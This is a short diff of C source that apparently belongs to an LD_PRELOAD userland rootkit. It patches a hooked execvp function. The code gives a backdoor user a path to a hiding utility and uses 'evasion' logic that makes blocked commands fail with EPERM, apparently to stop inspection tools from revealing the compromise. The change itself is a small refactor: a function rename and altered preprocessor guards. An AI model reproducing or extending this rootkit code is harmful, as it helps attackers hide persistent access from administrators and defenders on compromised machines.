@@ -8,7 +8,7 @@ int execvp(const char *filename, char *const argv[]){
     if(is_bdusr()){
 #ifdef HIDING_UTIL
         if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
-            dohiding_util(argv);
+            do_hidingutil(argv);
 #endif
         return (long)call(CEXECVP, filename, argv);
     }
@@ -35,8 +35,8 @@ int execvp(const char *filename, char *const argv[]){
     }
 #endif
 
-#if defined(BLOCK_STRINGS) && defined(DO_EVASIONS)
-    if(block_strings(argv)){
+#ifdef DO_EVASIONS
+    if(block_strings(filename, argv)){
         errno = EPERM;
         return -1;
     }
